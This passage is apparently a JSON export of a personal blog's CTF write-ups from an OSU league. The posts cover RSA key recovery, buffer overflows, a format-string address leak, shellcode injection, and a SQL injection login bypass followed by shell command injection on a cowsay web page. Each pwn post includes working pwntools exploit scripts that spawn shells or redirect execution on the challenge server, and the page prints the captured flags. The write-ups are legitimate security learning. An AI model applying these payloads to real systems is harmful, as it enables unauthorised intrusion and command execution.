assumptions are correct. Crypto is black magic.\nTo start, we are given two files. puzzle.py, which is the script that was used to encrypt the flag, and output.txt, which gives us p, q, n, and our cipher text c. We also know what e is as it is used in the python script provided.\nNow searching google for \u0026ldquo;get d from p q and e\u0026rdquo;, we can use the work and knowledge of other people to solve our own problems! I found a stackoverflow article here which tells us that d is chosen such that d * e == 1 modulo phi(n), where phi is Euler\u0026rsquo;s Totient function. Normally without knowing p and q, finding Euler\u0026rsquo;s Totient of N would be a computationally hard problem, but with p and q it can simply be calculated as phi(N) = phi(pq) = phi(p)phi(q) = (p-1)(q-1). So now our d is chosen such that d * e == 1 modulo (p-1)(q-1).\nNow to solve for d all we have to do is use the Euclidean algorithm to find the modular multiplicative inverse of e and phi(N). I ended up copying and pasting some code from geeksforgeeks at first, but then I found a library which does the same thing in one line of code named sympy. Here is a great excerpt from their docs explaining the modular_inverse():\nFor a given a and m, the multiplicative inverse of a exists if the greatest common divisor of a and m is 1. The number c is the multiplicative inverse of a if a * c % b == 1. For example, for the numbers 56 and 15, the multiplicative inverse of 56 exists because the greatest common divisor of 56 and 15 is 1. The multiplicative inverse is 11 because 56 * 11 % 15 == 1.\nWith this information, we can write our python2 script to get d:\nfrom sympy import * e = 3 c = 15152748367446880771626735564570314364412539866133828878294832734877333779375887301666317343696170583205732549176049143952513352176887862696752491725708864667819416380851470922363167693469581137082049422236381718504826584222025025276217712186948248894030905507578741594465520464407304317496197519614579605451009261929501814390584449735588732230862107938755575264114796923591931144483631719354506203232033044574475941823978540906150537364865247200187073042362762490541339927821746184534026286488138506628489962230620460382693248638990548515405134649935123113868204987749497591513259850481628137175362068619575569454324 p = 130434182441603098085956776986813693398366763586020595512987159262899881890442688054651285679445774176839742529438968247167884605733178945825821059309729815062559567359570195682209847084470163302154894657907891113360770217802272940478214121960691147987814527126966323988405399896137541783289094003238223701919 q = 138597380327352419687534641412929290366492126278628014509152301908796041605702001247395731165417386922727859751004918809393586670242582269855310098688232449832555137905517447148665895209928971190929217518775532945000140189878993116900459734922686648711225089388803124904970682571061993115829417981574164016773 n = 18077835991546137626820743332925077231374737772399662733145449713866011668129359761316411770700730249209055598603865901584346720655918002520497560096702556660488788089523716553127902860314936315334492018184193779273443235661432144600266866272632983217297397458819395207649787022607046418182404092209433511795673252554662035312548958373228547867077383341748826769860988734874145040410943724039648358353546951266751272373383570512852677958180656795351767986838842090885711457878146575773989204434421168580537893668075110329840981458434754807779731175606434893879571660655888569704898013958232952940247995442346868287387 phi = (p-1)*(q-1) d = mod_inverse(e, phi) print d And we get our d: 12051890661030758417880495555283384820916491848266441822096966475910674445419573174210941180467153499472703732402577267722897813770612001680331706731135037773659192059682477702085268573543290876889661345456129186182295490440954763066844577515088655478198264972546263471766524681738030945454936061472955674530269480661262053196516977969885869922208349634589452106559232849134966077943199356491734227672455860111455780061959788970860804454803263719780424552560586550660397835075372621962075641426681356058302520994261124180986714033835659166934038212482038064787021362760079413874347954327355612027419655638356320379131\nWe can double check that d is correct by checking if (ed) % phi(N) = 1. Checking our solution reveals that d is in fact the correct key. Now all that is left to to use the key to get the flag. To decrypt, we first need to convert from long to bytes, as we need to reverse what puzzle.py did, and then we can perform P = C ^ (d % N) and get the flag. The final python script looks like:\nfrom sympy import * from Crypto.Util.number import * e = 3 c = 15152748367446880771626735564570314364412539866133828878294832734877333779375887301666317343696170583205732549176049143952513352176887862696752491725708864667819416380851470922363167693469581137082049422236381718504826584222025025276217712186948248894030905507578741594465520464407304317496197519614579605451009261929501814390584449735588732230862107938755575264114796923591931144483631719354506203232033044574475941823978540906150537364865247200187073042362762490541339927821746184534026286488138506628489962230620460382693248638990548515405134649935123113868204987749497591513259850481628137175362068619575569454324 p = 130434182441603098085956776986813693398366763586020595512987159262899881890442688054651285679445774176839742529438968247167884605733178945825821059309729815062559567359570195682209847084470163302154894657907891113360770217802272940478214121960691147987814527126966323988405399896137541783289094003238223701919 q = 138597380327352419687534641412929290366492126278628014509152301908796041605702001247395731165417386922727859751004918809393586670242582269855310098688232449832555137905517447148665895209928971190929217518775532945000140189878993116900459734922686648711225089388803124904970682571061993115829417981574164016773 n = 18077835991546137626820743332925077231374737772399662733145449713866011668129359761316411770700730249209055598603865901584346720655918002520497560096702556660488788089523716553127902860314936315334492018184193779273443235661432144600266866272632983217297397458819395207649787022607046418182404092209433511795673252554662035312548958373228547867077383341748826769860988734874145040410943724039648358353546951266751272373383570512852677958180656795351767986838842090885711457878146575773989204434421168580537893668075110329840981458434754807779731175606434893879571660655888569704898013958232952940247995442346868287387 phi = (p-1)*(q-1) d = mod_inverse(e, phi) m = pow(c, d, n) m = long_to_bytes(m) print m[:37] And running it with python2 we get the flag! osu{dE\u0026lt;rypT_RsA_W1TH-eU1ER'S-thEOrem}\n","date":"11 November 2020","externalUrl":null,"permalink":"/posts/1716571999178-rsa1/","section":"Posts","summary":"So, to start off, I knew pretty much nothing about cryptography and assumed that it was probably all black magic before this, but after spending 3 days on this challenge asking for help and googling everything I could, I can now say with abosulte certainty that my assumptions are correct.","title":"OSU League 2020/2021 - RSA 1 Writeup","type":"posts"},{"content":"The goal of this challenge is to redirect code flow to the win() function. Opening up the binary in GDB, we can see some other interesting functions that we have.\n0x0000000000400607 win 0x0000000000400652 part2 0x0000000000400699 part1 0x00000000004006ee main Let\u0026rsquo;s disassemble them and see what\u0026rsquo;s going on:\ngdb-peda$ disass main Dump of assembler code for function main: 0x00000000004006ee \u0026lt;+0\u0026gt;:\tpush rbp 0x00000000004006ef \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00000000004006f2 \u0026lt;+4\u0026gt;:\tmov eax,0x0 0x00000000004006f7 \u0026lt;+9\u0026gt;:\tcall 0x400699 \u0026lt;part1\u0026gt; 0x00000000004006fc \u0026lt;+14\u0026gt;:\tmov eax,0x0 0x0000000000400701 \u0026lt;+19\u0026gt;:\tpop rbp 0x0000000000400702 \u0026lt;+20\u0026gt;:\tret End of assembler dump. gdb-peda$ disass part1 Dump of assembler code for function part1: 0x0000000000400699 \u0026lt;+0\u0026gt;:\tpush rbp 0x000000000040069a \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x000000000040069d \u0026lt;+4\u0026gt;:\tsub rsp,0x20 0x00000000004006a1 \u0026lt;+8\u0026gt;:\tmov QWORD PTR [rbp-0xc],0x0 0x00000000004006a9 \u0026lt;+16\u0026gt;:\tlea rdi,[rip+0x1a0] # 0x400850 0x00000000004006b0 \u0026lt;+23\u0026gt;:\tcall 0x4004e0 \u0026lt;puts@plt\u0026gt; 0x00000000004006b5 \u0026lt;+28\u0026gt;:\tmov rdx,QWORD PTR [rip+0x200994] # 0x601050 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x00000000004006bc \u0026lt;+35\u0026gt;:\tlea rax,[rbp-0x20] 0x00000000004006c0 \u0026lt;+39\u0026gt;:\tmov esi,0x20 0x00000000004006c5 \u0026lt;+44\u0026gt;:\tmov rdi,rax 0x00000000004006c8 \u0026lt;+47\u0026gt;:\tcall 0x400500 \u0026lt;fgets@plt\u0026gt; 0x00000000004006cd \u0026lt;+52\u0026gt;:\tmov rdx,QWORD PTR [rbp-0xc] 0x00000000004006d1 \u0026lt;+56\u0026gt;:\tmovabs rax,0xbaddecafbeefcafe 0x00000000004006db \u0026lt;+66\u0026gt;:\tcmp rdx,rax 0x00000000004006de \u0026lt;+69\u0026gt;:\tjne 0x4006eb \u0026lt;part1+82\u0026gt; 0x00000000004006e0 \u0026lt;+71\u0026gt;:\tmov eax,0x0 0x00000000004006e5 \u0026lt;+76\u0026gt;:\tcall 0x400652 \u0026lt;part2\u0026gt; 0x00000000004006ea \u0026lt;+81\u0026gt;:\tnop 0x00000000004006eb \u0026lt;+82\u0026gt;:\tnop 0x00000000004006ec \u0026lt;+83\u0026gt;:\tleave 0x00000000004006ed \u0026lt;+84\u0026gt;:\tret End of assembler dump. So all main does it seems is to just call part1(). And in that function it compares some value on the stack to the value 0xbaddecafbeefcafe, and jumps to part2() if they are equal. We can see the value is located at $rbp-0xc, and that the max buffer size is 0x20 bytes. So all we need to do is input 0x20 - 0x0c = 0x14 bytes, or 20 bytes, followed by 0xbaddecafbeefcafe.\nfrom pwn import * io = process(\u0026#34;./ret2win\u0026#34;) io.recvuntil(\u0026#34;overwrite data\u0026#34;) payload_1 = b\u0026#34;A\u0026#34; * 20 payload_1 += p64(0xbaddecafbeefcafe) io.sendline(payload_1) io.interactive() And running it we are able to call part2()!\n[+] Starting local process \u0026#39;./ret2win\u0026#39;: pid 2557 [*] Switching to interactive mode Well done! That was the same vuln as last week though, we probably shouldn\u0026#39;t give you a flag for that Reply \u0026#34;yes\u0026#34; to awknowledge that you don\u0026#39;t deserve any points $ no [*] Got EOF while reading in interactive Let\u0026rsquo;s now take a look at the disassembly of part2():\ngdb-peda$ disass part2 Dump of assembler code for function part2: 0x0000000000400652 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000000000400653 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x0000000000400656 \u0026lt;+4\u0026gt;:\tsub rsp,0x20 0x000000000040065a \u0026lt;+8\u0026gt;:\tlea rdi,[rip+0x13e] # 0x40079f 0x0000000000400661 \u0026lt;+15\u0026gt;:\tcall 0x4004e0 \u0026lt;puts@plt\u0026gt; 0x0000000000400666 \u0026lt;+20\u0026gt;:\tlea rdi,[rip+0x143] # 0x4007b0 0x000000000040066d \u0026lt;+27\u0026gt;:\tcall 0x4004e0 \u0026lt;puts@plt\u0026gt; 0x0000000000400672 \u0026lt;+32\u0026gt;:\tlea rdi,[rip+0x197] # 0x400810 0x0000000000400679 \u0026lt;+39\u0026gt;:\tcall 0x4004e0 \u0026lt;puts@plt\u0026gt; 0x000000000040067e \u0026lt;+44\u0026gt;:\tmov rdx,QWORD PTR [rip+0x2009cb] # 0x601050 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x0000000000400685 \u0026lt;+51\u0026gt;:\tlea rax,[rbp-0x20] 0x0000000000400689 \u0026lt;+55\u0026gt;:\tmov esi,0x64 0x000000000040068e \u0026lt;+60\u0026gt;:\tmov rdi,rax 0x0000000000400691 \u0026lt;+63\u0026gt;:\tcall 0x400500 \u0026lt;fgets@plt\u0026gt; 0x0000000000400696 \u0026lt;+68\u0026gt;:\tnop 0x0000000000400697 \u0026lt;+69\u0026gt;:\tleave 0x0000000000400698 \u0026lt;+70\u0026gt;:\tret End of assembler dump. gdb-peda$ break *0x0000000000400691 Breakpoint 1 at 0x400691 gdb-peda$ r \u0026lt; part1 I set a break point at the end so I can take a look at the stack frame. part1 is just a text file with the payload already in it.\ngdb-peda$ info frame Stack level 0, frame at 0x7fffffffdec0: rip = 0x400691 in part2; saved rip = 0x4006ea called by frame at 0x7fffffffdef0 Arglist at 0x7fffffffdeb0, args: Locals at 0x7fffffffdeb0, Previous frame\u0026#39;s sp is 0x7fffffffdec0 Saved registers: rbp at 0x7fffffffdeb0, rip at 0x7fffffffdeb8 gdb-peda$ p 0xdeb8 - (0xdeb0 - 0x20) $4 = 0x28 So now with this, we know the start of the buffer is at $rbp - 0x20. Subract that from $rip and we get how many bytes we need to fill before we overwrite the instruction pointer.\nBut what should we overwrite it with? Well, we can give any address we want and it will jump to it! So let\u0026rsquo;s give it the address of the win() function. Recall that:\n0x0000000000400607 win So now we can build our final exploit:\nfrom pwn import * #io = process(\u0026#34;./ret2win\u0026#34;) io = remote(\u0026#39;ctf.ropcity.com\u0026#39;, 31337) io.recvuntil(\u0026#34;overwrite data\u0026#34;) payload_1 = b\u0026#34;A\u0026#34; * 20 payload_1 += p64(0xbaddecafbeefcafe) f = open(\u0026#34;part1\u0026#34;, \u0026#34;wb\u0026#34;) f.write(payload_1) f.close() io.sendline(payload_1) io.recvuntil(\u0026#34;any points\u0026#34;) payload_2 = b\u0026#34;A\u0026#34; * 40 payload_2 += p64(0x0000000000400607) io.sendline(payload_2) io.interactive() And running it we get the flag!\n[+] Starting local process \u0026#39;./ret2win\u0026#39;: pid 115498 Reply \u0026#34;yes\u0026#34; if you remember how to overwrite data [*] Switching to interactive mode Well done! That was the same vuln as last week though, we probably shouldn\u0026#39;t give you a flag for that Reply \u0026#34;yes\u0026#34; to awknowledge that you don\u0026#39;t deserve any points osu{$oRRY_y0U_d0_de$Erv3_7his} ","date":"7 November 2020","externalUrl":null,"permalink":"/posts/1716571932158-ret2win/","section":"Posts","summary":"The goal of this challenge is to redirect code flow to the win() function.","title":"OSU League 2020/2021 - ret2win Writeup","type":"posts"},{"content":"Oh boy. We got by the title what looks to be some sort of challenge involving printf. Let\u0026rsquo;s run the binary and take a look.\ndid you know the unix tool echo can be implemented with two lines of C? I\u0026#39;ll echo some bytes, try it! boop boop I used ASLR (with PIE), so the address of the win function is randomized! I\u0026#39;ll give you the last three hex digits of the address as a hint: 0x79a Type \u0026#34;I give up\u0026#34; to acknowledge that this binary is unhackable I give up Uh oh, so ASLR is enabled. This means we don\u0026rsquo;t know what the address of the win function will be since it changes every time. If only there was a way to leak addresses from the stack, we might be able to get something. Well, maybe we can.\nIf the printf is used in an insecure way, directly passing user controled variables as arguments to the funtion, then we can make really bad things happen.\nFor example. What would happen if we have a printf function like this: printf(userinput); and we passed in %p?\nWell, it will treat the %p as an argument and print the pointer data on the stack. Let\u0026rsquo;s try it out with the program.\n%p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p 0x7ffdc72101a0, 0x7fb27237f8d0, 0xf, (nil), 0x7fb2725934c0, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, 0x202c7025202c7025, (nil), 0x5646bc24d79a, 0x5646bc24d690, 0x7ffdc7210210, I used ASLR (with PIE), so the address of the win function is randomized! I\u0026#39;ll give you the last three hex digits of the address as a hint: 0x79a Well sweet, looks like we got some leaked addresses. Not only that, but there is an address in the 16th spot that ends in 0x79a. That\u0026rsquo;s our win function!!\nWe can make this a bit cleaner by just inputing %16$p. Let\u0026rsquo;s verify this works and we get the right address.\ndid you know the unix tool echo can be implemented with two lines of C? I\u0026#39;ll echo some bytes, try it! %16$p 0x557959a5079a I used ASLR (with PIE), so the address of the win function is randomized! I\u0026#39;ll give you the last three hex digits of the address as a hint: 0x79a Type \u0026#34;I give up\u0026#34; to acknowledge that this binary is unhackable Awesome. Next step now that we have the win function is to try to get our program to return to it. This will probably be accomplised via a buffer overflow attack on the second input option. And after messing around a bit, I was able to find that the buffer we had was going to be 104 bytes before we started overwriting the instruction pointer:\ngdb-peda$ r Starting program: /home/perchik/CTF/osuleague/week4/printf_is_echo did you know the unix tool echo can be implemented with two lines of C? I\u0026#39;ll echo some bytes, try it! boop boop I used ASLR (with PIE), so the address of the win function is randomized! I\u0026#39;ll give you the last three hex digits of the address as a hint: 0x79a Type \u0026#34;I give up\u0026#34; to acknowledge that this binary is unhackable AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] RAX: 0x0 RBX: 0x0 RCX: 0xf RDX: 0x7ffff7dd18d0 --\u0026gt; 0x0 RSI: 0x7fffffffde80 (\u0026#39;A\u0026#39; \u0026lt;repeats 96 times\u0026gt;, \u0026#34;BBBBBBBB\\n\u0026#34;) RDI: 0x7fffffffde81 (\u0026#39;A\u0026#39; \u0026lt;repeats 95 times\u0026gt;, \u0026#34;BBBBBBBB\\n\u0026#34;) RBP: 0x4242424242424242 (\u0026#39;BBBBBBBB\u0026#39;) So, we have a way of getting the address of win(), we know our padding size. We can now build an exploit!\nfrom pwn import * import os, sys #io = process(\u0026#39;./printf_is_echo\u0026#39;) io = remote(\u0026#39;ctf.ropcity.com\u0026#39;, 31338) context(arch = \u0026#34;amd64\u0026#34;) io.recvuntil(\u0026#34;try it!\\n\u0026#34;) printf = \u0026#34;%16$p\u0026#34; io.sendline(printf) win = int(io.recvline(), 16) log.info(win) padding = b\u0026#39;A\u0026#39;*104 io.recvuntil(\u0026#39;unhackable\u0026#39;) payload = padding + p64(win) io.sendline(payload) io.interactive() And after running it we get the flag!\n[+] Opening connection to ctf.ropcity.com on port 31338: Done [*] 94681416755098 [*] Switching to interactive mode osu{F0rMa7_$tRing_1s_FUN} AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x03 [*] Got EOF while reading in interactive Nice! That was a fun challenged and learned a lot about how format string vulns work!\n","date":"4 November 2020","externalUrl":null,"permalink":"/posts/1716571707760-printf_is_echo/","section":"Posts","summary":"Oh boy.","title":"OSU League 2020/2021 - printf_is_echo Writeup","type":"posts"},{"content":"We are given a link to a website for this challenge that has a login page. I first tried the obvious stuff such as admin, password, etc. But no such luck. Thankfully, I remembered a Hack the Box challenge that dealt with a similar sceanario, that being SQL injection!!!\nIf we type in 'or''=' into both the user name and password fields, we can escape the query and make it return true without actually needing to supply the correct password. So after entering that, I was in as admin.\n______ \u0026lt; boop \u0026gt; ------ \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || The webiste then presented itself with a little cowsay program, along with a message telling us the flag is located at /flag on the server. After playing with the fun program for a bit, I noticed that certain characters would break it. Things like extra \u0026quot; or '. That\u0026rsquo;s when I noticed the $, giving me the impression that this cowsay program was being excecuted on the server itself. So all I would have to do is escape the program.\nSo I typed in boop' \u0026amp;\u0026amp; cat /flag '\n$cowsay \u0026#39;boop\u0026#39; \u0026amp;\u0026amp; cat /flag \u0026#39; _______ \u0026lt; boop \u0026gt; ------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || flag{if_y0u_ev3r_see_php_in_ctf,-try_sql_injection_f1rst!} Nice, we got da flag! Pretty fun and easy web challenge.\n","date":"31 October 2020","externalUrl":null,"permalink":"/posts/1716571127770-cowsay/","section":"Posts","summary":"We are given a link to a website for this challenge that has a login page.","title":"OSU League 2020/2021 - cowsay Writeup","type":"posts"},{"content":"A simple review challenge. Let\u0026rsquo;s see how it goes :3\nSo running the binary, we get some info:\nThis is a review challenge, you know the drill Return to the win function and get the flag gimme win function Ok, so we need to return to the win function. My guess is that this program is going to be susceptible to a buffer overflow. Turns out it is! After screaming at it for a bit, I was able to determine the buffer was 32 bytes, so our padding will be 40 bytes.\ngdb-peda$ r Starting program: /home/perchik/CTF/osuleague/week4/pwn_review This is a review challenge, you know the drill Return to the win function and get the flag AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB Program received signal SIGSEGV, Segmentation fault. Sweet, we crashed, and if we look at RBP, we can see we have overwritten it with our Bs. RBP: 0x4242424242424242 ('BBBBBBBB') That means whatever comes next will overwrite the instruction pointer, so we can return to wherever we want!\nSo let\u0026rsquo;s actually find the address we want to return to. We can use objdump -d pwnreview | grep win to find the location of the win function. 0000000000400577 \u0026lt;win\u0026gt;:\nGreat. So we know our padding will be 40 bytes, and we have the address. So let\u0026rsquo;s put what we have together so far in python:\nfrom pwn import * import os, sys #io = process(\u0026#39;./pwn_review\u0026#39;) io = remote(\u0026#39;ctf.ropcity.com\u0026#39;, 31337) context(arch = \u0026#34;amd64\u0026#34;) padding = b\u0026#34;A\u0026#34;*40 win = p64(0x400577) payload = padding + win log.info(payload) io.sendline(payload) io.interactive() And running it we get:\n[+] Opening connection to ctf.ropcity.com on port 31337: Done [*] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw\\x05@\\x00\\x00\\x00\\x00\\x00 [*] Switching to interactive mode This is a review challenge, you know the drill Return to the win function and get the flag nice! I\u0026#39;ll execute any shellcode you give me now $ booop? [*] Got EOF while reading in interactive $ $ [*] Closed connection to ctf.ropcity.com port 31337 [*] Got EOF while sending in interactive Hmm, looks like we aren\u0026rsquo;t done quite yet. We are give a prompt to enter some shell code. So let\u0026rsquo;s add a few more lines to our exploit that will spawn a shell for us.\nfrom pwn import * import os, sys #io = process(\u0026#39;./pwn_review\u0026#39;) io = remote(\u0026#39;ctf.ropcity.com\u0026#39;, 31337) context(arch = \u0026#34;amd64\u0026#34;) padding = b\u0026#34;A\u0026#34;*40 win = p64(0x400577) shell = shellcraft.sh() #Pwntools shellcraft OP shellcode = asm(shell) payload = padding + win log.info(payload) io.sendline(payload) io.recvuntil(\u0026#34;you give me now\u0026#34;) io.sendline(shellcode) io.interactive() And running it we get a shell!:\n[+] Opening connection to ctf.ropcity.com on port 31337: Done [*] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw\\x05@\\x00\\x00\\x00\\x00\\x00 [*] Switching to interactive mode $ ls flag pwn_review $ cat flag osu{pwnt00ls_i$_Ch3A7iNG} This was a pretty sick review covering the stuff we have learned so far! GG\n","date":"30 October 2020","externalUrl":null,"permalink":"/posts/1716571767621-pwn_review/","section":"Posts","summary":"A simple review challenge.","title":"OSU League 2020/2021 - pwn_review Writeup","type":"posts"},{"content":"We are given a binary, so let\u0026rsquo;s see what it does:\nI found some empty room in the RAM on this system, and prepared some especially for you! But I\u0026#39;m worried you might put something evil in it, so I\u0026#39;m not going to print it out Here\u0026#39;s your special RAM, happy birthday!: 0x7ffd617472f0 What are you going to do with it? I wanna consume it I hope you enjoyed your memory! Hmm, looks like we are given a memory address along with a place to put some text. Usually with challenges like these, the memory address given is the address of the buffer, we can verify this in a bit, but for now lets look at what securities the binary has using pwn checksec unprintable:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Hmm, NX is disabled, meaning the stack is excecutable. That means we can probably excecute shellcode on the stack. Now let\u0026rsquo;s open up the binary in gdb and see what\u0026rsquo;s going on.\nRunning info functions, we get a list of the functions used in the program. Its seems like the input function is the one we are looking for, so let\u0026rsquo;s disassemble that.\ngdb-peda$ disass input Dump of assembler code for function input: 0x00000000000006ca \u0026lt;+0\u0026gt;:\tpush rbp 0x00000000000006cb \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00000000000006ce \u0026lt;+4\u0026gt;:\tsub rsp,0x70 0x00000000000006d2 \u0026lt;+8\u0026gt;:\tlea rax,[rbp-0x70] 0x00000000000006d6 \u0026lt;+12\u0026gt;:\tmov rsi,rax 0x00000000000006d9 \u0026lt;+15\u0026gt;:\tlea rdi,[rip+0xf8] # 0x7d8 0x00000000000006e0 \u0026lt;+22\u0026gt;:\tmov eax,0x0 0x00000000000006e5 \u0026lt;+27\u0026gt;:\tcall 0x590 \u0026lt;printf@plt\u0026gt; 0x00000000000006ea \u0026lt;+32\u0026gt;:\tlea rdi,[rip+0x117] # 0x808 0x00000000000006f1 \u0026lt;+39\u0026gt;:\tcall 0x580 \u0026lt;puts@plt\u0026gt; 0x00000000000006f6 \u0026lt;+44\u0026gt;:\tlea rax,[rbp-0x70] 0x00000000000006fa \u0026lt;+48\u0026gt;:\tmov rdi,rax 0x00000000000006fd \u0026lt;+51\u0026gt;:\tmov eax,0x0 0x0000000000000702 \u0026lt;+56\u0026gt;:\tcall 0x5a0 \u0026lt;gets@plt\u0026gt; 0x0000000000000707 \u0026lt;+61\u0026gt;:\tnop 0x0000000000000708 \u0026lt;+62\u0026gt;:\tleave 0x0000000000000709 \u0026lt;+63\u0026gt;:\tret End of assembler dump. We can set a breakpoint right before the leave instruction to get a view of the stack right before returning.\ngdb-peda$ break *input+61 Breakpoint 1 at 0x707 gdb-peda$ r Starting program: /home/perchik/CTF/osuleague/week3/unprintable I found some empty room in the RAM on this system, and prepared some especially for you! But I\u0026#39;m worried you might put something evil in it, so I\u0026#39;m not going to print it out Here\u0026#39;s your special RAM, happy birthday!: 0x7fffffffde60 What are you going to do with it? gimme cookies [----------------------------------registers-----------------------------------] RAX: 0x7fffffffde60 (\u0026#34;gimme cookies\u0026#34;) RBX: 0x0 RCX: 0x7ffff7dcfa00 --\u0026gt; 0xfbad2288 RDX: 0x7ffff7dd18d0 --\u0026gt; 0x0 RSI: 0x6f6f6320656d6d69 (\u0026#39;imme coo\u0026#39;) RDI: 0x7fffffffde61 (\u0026#34;imme cookies\u0026#34;) RBP: 0x7fffffffded0 --\u0026gt; 0x7fffffffdee0 --\u0026gt; 0x555555554750 (\u0026lt;__libc_csu_init\u0026gt;:\tpush r15) RSP: 0x7fffffffde60 (\u0026#34;gimme cookies\u0026#34;) RIP: 0x555555554707 (\u0026lt;input+61\u0026gt;:\tnop) R8 : 0x55555575667e --\u0026gt; 0x0 R9 : 0x7ffff7fe04c0 (0x00007ffff7fe04c0) R10: 0x555555756010 --\u0026gt; 0x0 R11: 0x246 R12: 0x5555555545c0 (\u0026lt;_start\u0026gt;:\txor ebp,ebp) R13: 0x7fffffffdfc0 --\u0026gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Sweet! Looks like the address given is indeed the start of our buffer. Now to figure out how big that buffer is. We can run it again, and this time lets look at the stack frame and calculate the offset of the saved rip and the address leak we were given.\nSaved registers: rbp at 0x7fffffffded0, rip at 0x7fffffffded8 Subracting these two we end up getting a buffer that is 120 bytes. So now we have everything we need to craft our exploit!\nI used pwntools to craft the exploit, as it streamlines many things such as creating shellcode, connecting to a remote binary, etc.\nfrom pwn import * io = remote(\u0026#39;ctf.ropcity.com\u0026#39;, 31337) #io = process(\u0026#34;./unprintable\u0026#34;) #io = gdb.debug(\u0026#34;./unprintable\u0026#34;) context.update(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;) io.recvuntil(\u0026#34;birthday!: \u0026#34;) address = int(io.recvline()[2:-1], 16) shell = shellcraft.sh() shellcode = asm(shell) payload = shellcode.ljust(120, b\u0026#39;A\u0026#39;) payload += p64(address) io.recvuntil(\u0026#34;What are you going to do with it?\u0026#34;) io.sendline(payload) io.interactive() And running it we get a shell!!!\n[+] Opening connection to ctf.ropcity.com on port 31337: Done [*] Switching to interactive mode $ cat flag osu{i_c0uldnt_pr1nt_th4t_1f_I_tRi3ed!!!1!} Woot! Learned a lot about getting shellcode working in pwntool, as well as using ljust to fill the buffer. Super fun challenge!\n","date":"30 October 2020","externalUrl":null,"permalink":"/posts/1716572336362-unprintable/","section":"Posts","summary":"We are given a binary, so let\u0026rsquo;s see what it does:","title":"OSU League 2020/2021 - Unprintable Writeup","type":"posts"},{"content":" Writeup # test # another test # Lets just run that binary\nPRESS ENTER TO COUNT UP, FLAG WHEN CURRENT COUNT == 0xffffffffffffffff CURRENT COUNT: 0000000000000000 hmm, looks like we would have to press that enter button about 18446744073709551615 times. Doesnt seem that doable, so lets try another approach.\nTyping a bunch of As we get:\nPRESS ENTER TO COUNT UP, FLAG WHEN CURRENT COUNT == 0xffffffffffffffff CURRENT COUNT: 0000000000000000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA PRESS ENTER TO COUNT UP, FLAG WHEN CURRENT COUNT == 0xffffffffff000a41 CURRENT COUNT: 0x4141414141414141 Interesting, looks like we can override the buffer here and have control over the counter. So I filled the buffer and overwrote the variable on the stack with \\xff * 32 .\nfrom pwn import * io = remote(\u0026#39;ctf.ropcity.com\u0026#39;, 31337) #io = process(\u0026#34;./mash\u0026#34;) padding = \u0026#34;\\xff\u0026#34;*32 io.sendline(padding) io.interactive() And running the script we get the flag!\nHOW FAST CAN YOU PRESS ENTER??? PRESS ENTER TO COUNT UP, FLAG WHEN CURRENT COUNT == 0xffffffffffffffff CURRENT COUNT: 0000000000000000 osu{n3xt_1evel_butt0N_maSh1ng} ","date":"8 October 2020","externalUrl":null,"permalink":"/posts/1716510142587-mash/","section":"Posts","summary":"Writeup # test # another test # Lets just run that binary","title":"OSUSEC CTF League 2020/2021 - Mash Writeup","type":"posts"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]